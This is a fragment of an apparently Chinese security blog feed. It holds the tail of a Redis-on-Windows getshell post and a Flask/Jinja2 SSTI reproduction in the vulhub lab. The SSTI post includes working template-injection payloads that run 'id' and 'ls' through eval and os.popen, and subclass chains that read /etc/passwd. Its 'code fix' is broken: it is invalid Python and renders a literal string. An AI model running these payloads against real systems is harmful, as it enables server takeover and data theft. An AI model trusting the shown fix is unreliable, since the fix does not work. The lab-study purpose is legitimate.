<p>https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</p>
<h2 id="一些其它的方法">一些其它的方法</h2>
<p>1.dll劫持</p>
<p>2.覆写一些文件，让用户点击。</p>
<p>3.覆写sethc.exe。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Flask ssti 漏洞复现]]></title>
        <id>https://www.yyxyy.xyz/post/flask-ssti-lou-dong-fu-xian/</id>
        <link href="https://www.yyxyy.xyz/post/flask-ssti-lou-dong-fu-xian/">
        </link>
        <updated>2021-06-09T08:01:44.000Z</updated>
        <content type="html"><![CDATA[<h4 id="flask-ssti-漏洞复现">Flask ssti 漏洞复现</h4>
<h6 id="环境">环境</h6>
<p>使用vulhub里面的flask/ssti环境</p>
<h6 id="查看源码发现漏洞处">查看源码，发现漏洞处</h6>
<pre><code class="language-python">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get('name', 'guest')

    t = Template(&quot;Hello &quot; + name)
    return t.render()

if __name__ == &quot;__main__&quot;:
    app.run()
    
    
// 很简单发现了name变量是我们能够控制的。
</code></pre>
<h6 id="漏洞成因分析">漏洞成因分析</h6>
<p>首先输入正常值</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/1.png" alt="" loading="lazy"></figure>
<p>然后输入嵌套jinja2语法的语句</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/2.png" alt="" loading="lazy"></figure>
<p>很容易就发现了这一处漏洞</p>
<h6 id="代码修复">代码修复</h6>
<pre><code class="language-python">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get('name', 'guest')

    t = Template(&quot;Hello &quot; + {{temp}})
    return t.render(temp=&quot;name&quot;)

if __name__ == &quot;__main__&quot;:
    app.run()
    
//这样就能避免这个漏洞
</code></pre>
<h6 id="漏洞利用">漏洞利用</h6>
<p>vulhub的POC</p>
<pre><code class="language-jinja2">{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
</code></pre>
<p>得到一下结果</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/3.png" alt="" loading="lazy"></figure>
<h6 id="python沙盒逃逸">python沙盒逃逸</h6>
<p>vulhub的POC里面用的是一些python的魔术方法，因为在jinja2里面我们是可以访问python的一些对象和方法。</p>
<p>Python的一些魔术方法</p>
<pre><code class="language-python"># 1 __class__ : 返回当前对象所属的类
&gt;&gt;&gt; ().__class__
&lt;class 'tuple'&gt;
&gt;&gt;&gt; [].__class__
&lt;class 'list'&gt;

#2 __base__&amp;&amp;__bases__ :作用都是返回当前类所继承的类，即基类，区别是base返回单个，bases以元组形式返回所有基类。
&gt;&gt;&gt; class A():
...     pass
&gt;&gt;&gt; class B():
...     pass
&gt;&gt;&gt; class C(A,B):
...     pass
&gt;&gt;&gt; C.__base__
&lt;class '__main__.A'&gt;
&gt;&gt;&gt; C.__bases__
(&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)

#3 __mro__ :以元组的方式返回继承关系
&gt;&gt;&gt; C.__mro__
(&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;)


#4 __subclasses__():以列表的形式返回类的子类
&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()
[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'BaseException'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib._installed_safely'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'nt.ScandirIterator'&gt;, &lt;class 'nt.DirEntry'&gt;, &lt;class 'PyHKEY'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;]

#5 __globals__ :以字典的形式返回函数所在模块命名空间的所有变量。
#所有的函数都会有一个__globals__属性，可以通过globals获得大量内置函数，包括eval，exec等执行命令的1的函数

#6 __builtin__&amp;&amp;__builtins__: python中直接能用的比如int(),list()等函数，可以直接在builtins里面查询到。（python3）
&gt;&gt;&gt; import builtins
&gt;&gt;&gt; dir(builtins)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']

#python2：dir(__builtins__)
'''
__builtin__ 和 __builtins__之间是什么关系呢？
1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。
2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身
'''



#利用python特殊方法bypass沙盒


## 构造继承链的思想

#1.任意使用一个内置对象用class拿到他所对应的类
#2.用bases拿到基类（&lt;class 'object'&gt;）
#3.用subclasses()拿到子类列表
#4.在字类里面寻找可以利用的类

&gt;&gt;&gt; t = ().__class__.__bases__[0].__subclasses__()
&gt;&gt;&gt; for c in t:
...     if c.__name__== 'file':
...             print t.index(c)
... 
40
#寻找file对象


&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines)
['__call__', '__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
#使用dir查看对象内置方法：



</code></pre>
<p>同样的方法使用eval方法来获取目录文件</p>
<pre><code class="language-jinja2">{% for c in ().__class__.__bases__[0].__subclasses__(): %}
{% if c.__name__ == '_IterationGuard': %}
{{c.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('ls').read()&quot;) }}
{% endif %}
{% endfor %}
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/4.png" alt="" loading="lazy"></figure>
<p>参考链接：<a href="https://www.freebuf.com/articles/web/98619.html">https://www.freebuf.com/articles/web/98619.html</a></p>
<p>​		<a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
<p>​		<a href="https://eustiar.com/archives/157">https://eustiar.com/archives/157</a></p>
]]></content>
    </entry>
</feed>